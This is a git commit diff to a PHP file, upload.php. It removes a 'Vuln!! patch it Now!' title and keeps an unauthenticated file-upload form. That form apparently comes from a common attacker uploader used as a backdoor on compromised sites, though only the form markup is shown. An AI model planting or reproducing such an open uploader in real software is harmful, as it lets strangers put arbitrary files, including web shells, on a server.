5edc613fd8a06b5b62046e14c8f475f10afac9f0
zusini <37207085+zusini@users.noreply.github.com>
2020-05-21 17:37:48 +0700

    Update upload.php

--- upload.php
+++ upload.php
@@ -1,4 +1,3 @@
-<title>Vuln!! patch it Now!</title>
 <?php
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
